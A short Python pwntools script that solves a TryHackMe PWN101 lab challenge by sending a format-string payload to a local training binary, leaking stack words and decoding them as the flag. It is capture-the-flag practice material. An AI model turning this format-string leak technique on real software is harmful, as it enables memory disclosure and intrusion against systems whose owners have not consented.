#!/usr/bin/python3

# TryHackMe - Room PWN101 - Challenge 6

from pwn import *
#context.log_level = 'debug'

host = "10.10.10.10"
port = 9006
#io = remote(host, port)

executable = './106'
io = process(executable)

payload = flat([
    b"%6$lX.%7$lX.%8$lX.%9$lX.%10$lX.%11$lX"
])

io.sendlineafter(b"giveaway:", payload)

# The flag in is little endian
flag = io.recvall().strip().split()[1].split(b'.')

for word in flag:
    print(bytes.fromhex(word.decode('utf-8')).decode('utf-8')[::-1], end='')

#io.interactive()  
exit()
